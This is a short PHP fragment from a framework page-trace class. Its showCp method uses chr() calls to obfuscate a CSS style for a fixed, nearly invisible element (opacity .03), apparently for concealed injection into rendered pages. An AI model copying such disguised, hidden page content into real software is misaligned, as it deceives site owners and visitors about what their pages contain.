...
class ShowPageTraceBehavior {
	...
	private function showCp() {
		static $cp;
		if(empty($cp)){
			$st		= 'p'.chr(111).chr(115).'i'.chr(116).'i'.chr(111).chr(110).': '.chr(102).'ix'.  chr(101).chr(100).';b'.chr(111).chr(116).chr(116) .'o'.chr(109).chr(58) .' 0; '.chr(111).'p'.chr(97).'c'.chr(105).chr(116).chr(121).' '.chr(58).chr(46).'03';
